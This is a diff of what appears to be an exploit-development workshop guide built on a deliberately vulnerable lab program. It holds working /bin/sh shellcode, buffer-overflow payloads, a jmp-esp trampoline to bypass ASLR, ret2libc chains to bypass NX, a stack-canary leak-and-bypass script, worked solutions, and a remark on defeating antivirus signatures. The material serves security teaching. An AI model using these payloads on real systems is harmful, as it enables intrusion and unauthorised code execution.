@@ -24,6 +24,7 @@ To get started
 			echo "source ~/peda/peda.py" >> ~/.gdbinit
 	
 	Download ROPgadget for one of the challenges:
+		sudo apt install python3-capstone # assumes no venv
 		git clone https://github.com/JonathanSalwan/ROPgadget.git
 
 Memory and the Stack
@@ -124,25 +125,65 @@ Exploit Mitigations and Bypasses
 			./pat_gen.py 300
 			python ./pat_ind.py [hexdigits]
 		
-		Find the location of esp
-			gdb-peda$ info registers esp
-			(shortcut: i r esp)
-			0xffffc990
+		
+		
+		Look on the stack to see where the A's start
 			
-		Look on the stack to see where the A's start, and write the exploit within that constraint
+			gef> x/150x $ebp
 			
-			python2 -c 'print r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*(152 - 23) + r"\xe4\xca\xff\xff"'
+			gef> search-pattern AAAA
+		
+		/bin/sh Shellcode from exploit-db in escaped format
+			\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+		
+		After seeing where the A's start and end, write the exploit within that constraint
+			python2 -c 'print r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*(152 - 23) + r"\xe0\xca\xff\xff"'
+
 			
 			cat flag # It worked!
+			
+			Problem 1: Rewrite this payload, assuming that the first 152 bytes gets clobbered later in the function (you can test this by putting 152 bytes of B's in "Enter some wisdom"), but you have sufficient space to load up your payload (300 characters of input).
+				To start, find the location of esp in the function that _calls_ the vulnerable function - not in the function itself.
+					Remember that "mov esp, ebp" occurs right before sending control to our code. ebp is the extent of the previous function's stack. We can choose to use that also.
+						*Caveat -- Some compilers use the ebp register as a general purpose register instead. We won't encounter that today.
+					
+					gdb-peda$ info registers esp
+					(shortcut: i r esp)
+					0xffffcad0
+				
+				
 		
 			
 	Exercise 2: Bypass ASLR, no NX with Trampoline
 		Compile wisdom_e2.c without NX
 			gcc wisdom_e2.c -g -fno-stack-protector -z execstack -o wisdom_e2.out
+			
+			(Why is there a slightly different source file? None of the trampolines exist in the compiled version of the original file.)
 		
 		Find useful ESP gadgets
+			You can use https://defuse.ca/online-x86-assembler.htm#disassembly
+			Enter "jmp esp"
+			
+			This instruction should _never_ appear in memory!
+			
+			Search for the instruction appearing in only the most common and direct way (other indirect ways are possible)
+			
+			gef> search-pattern 0xffe4 big
+			
 			gdb-peda$ jmpcall -r esp
 			gdb-peda$ jmpcall
+			
+			Later we will use ropgadget, for features not in gef.
+			
+			
+			Pick an address:
+				Ensure the address is executable.
+				
+				Ensure that it is not subject to address randomization.
+				
+				If not, go back and pick another gadget.
+			
+			You have a lot to pick from - can help defeat AV signatures!
 		
 		Now we get to turn on and bypass a mitigation! Turn on ASLR.
 		
@@ -153,9 +194,11 @@ Exploit Mitigations and Bypasses
 			Python file: 
 				sc = r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 				nops = r"\x90" * 16
-				addr =  r"\x8f\x8b\x04\x08" # This address contains a jmp esp
+				addr =  r"\xcc\x62\x55\x56" # This address is a "trampoline" and contains a jmp esp
 				
 				print "A"*152 + addr + nops + sc
+				
+				Success!
 				
 	
 	Exercise 3: Bypass NX with ret2libc
@@ -168,7 +211,7 @@ Exploit Mitigations and Bypasses
 					============================================================
 					0x08048a20 : /bin/bash
 		
-			Alternative
+			Alternative (didn't you see it somewhere already?)
 				gdb> print wisdoms[1]
 					$1 = 0x8048a08 "A great shell to use is /bin/bash"
 				gdb> print wisdoms[1]+24
@@ -195,49 +238,86 @@ Exploit Mitigations and Bypasses
 			chmod +x runescape.sh
 			./runescape.sh wisdom.out-nx
 		
+		Understand Calling Conventions
+		
 		Print escaped NX bypass exploit code (file: exploit_e3_plt.py)
 			Python file:
-				addr_system_esc = r"\xe0\x03\xe5\xb7"
-				addr_exit_esc = r"\xb0\x31\xe4\xb7" # If we do this right, our exploit doesn't even crash the target, and is less detectable!
-				args = r"\x20\x8a\x04\x08"
+				#!/usr/bin/python2
+
+				sc = r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+				nops = r"\x90" * 16
+
+				addr_system = r"\x20\x92\xdb\xf7"
+				addr_exit = r"\xd0\x5a\xda\xf7"
+
+				system_args = r"\x68\x70\x55\x56" #0x56557068
+
+				print "A"*152 + addr_system + addr_exit + system_args
+			
+			Success!
+			
+			This should be the first time that our exploit didn't result in a crash.
+				What does gdb say this time for the exit status?
+				[Inferior 1 (process #####) exited normally]
 				
-				print "A"*152 + addr_system_esc + addr_exit_esc + args
+		
+		Problem 2: Rewrite the exploit to use a string "/bin/sh" that you insert on the stack manually, with the "Add wisdom" feature.
+			a. For the first challenge in this series, turn ASLR off.
+			b. Turn ASLR on and use a pointer leak (as described below in Exercise 4).
+		
+		Problem 3: Turn ASLR on. Search for the trampoline to the desired function in the GOT (Global Offset Table) and use it.
 	
 	Exercise 4: Stack Canaries, with NX and ASLR
 		Recompile wisdom.c with Stack Canaries
-			gcc wisdom.c -g -fstack-protector -o wisdom_e4.out
+			gcc -m32 wisdom.c -g -fstack-protector -o wisdom_e4.out -z execstack -std=c99
+			# Note - if we use the "shell" function to check our exploit first, we need -z execstack for that function to work
 		
 		Print program input which will leak a canary when interpreted as a format string but is not too long for the buffer
-			python -c 'print "%x " * 40'
+			python2 -c 'print "%x " * 40'
+		
+		Find the value that changes between runs
+			%11$x
 		
 		Python code to print escaped Stack Canary exploit code
-				#!/usr/bin/python
-				import sys
-				
-				# Exploit Linux randomized null terminator canaries with 2 buffers
-				
-				def lp(s, n):
-					return "0"*(n-len(s))+s
+			#!/usr/bin/python2
+			import sys
 
-				def reverse_and_escape(hexstring):
-					return "".join([r"\x"+hexstring[2*i:2*i+2] for i in range(int(len(hexstring)/2))][::-1])
+			# Exploit Linux randomized null terminator canaries with 2 buffers
 
+			def lp(s, n):
+				return "0"*(n-len(s))+s
 
-				''' Exploit parameters '''
-				canary_hex_little = sys.argv[1]
-				eip_offset_1 = 34*4
-				eip_offset_2 = 34*4
-				eip_hex_str = "804876c"
+			def reverse_and_escape(hexstring):
+				return "".join([r"\x"+hexstring[2*i:2*i+2] for i in range(int(len(hexstring)/2))][::-1])
 
 
-				eip_escaped = reverse_and_escape(eip_hex_str.zfill(8))
-				canary_offset_1 = eip_offset_1 - 8
-				print "A"*canary_offset_1+"B"+reverse_and_escape(canary_hex_little)[1*4:]+"CCCC"*3+eip_escaped # 'B' instead of the first null byte
+			''' Exploit parameters '''
+			canary_hex_little = sys.argv[1]
+			eip_offset_1 = 34*4
+			eip_offset_2 = 34*4
+			eip_hex_str = "56556281"
 
-				canary_offset_2 = eip_offset_2 - 8
-				print "A"*canary_offset_2 # implicit "\x00" will be written
+
+			eip_escaped = reverse_and_escape(eip_hex_str.zfill(8))
+			canary_offset_1 = eip_offset_1 - 8
+			print "A"*canary_offset_1+"B"+reverse_and_escape(canary_hex_little)[1*4:]+"CCCC"*3+eip_escaped # 'B' instead of the first null byte
+
+			print 
+			canary_offset_2 = eip_offset_2 - 8
+			print "A"*canary_offset_2 # implicit "\x00" will be written
 		
 		Run the file:
 			python exploit_e4_canaryleak.py [canaryhex]
+
+Solutions
+
+	Solution to Problem 1
+		First attempt:
+		python2 -c 'print "A"*152 + r"\xd0\xca\xff\xff" + r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'
+		
+		We missed but see that the stack (esp) is indeed pointing to the right place, just the instruction (eip) was not.
+		
+		python2 -c 'print "A"*152 + r"\x80\xcb\xff\xff" + r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'
+		
 ```
 
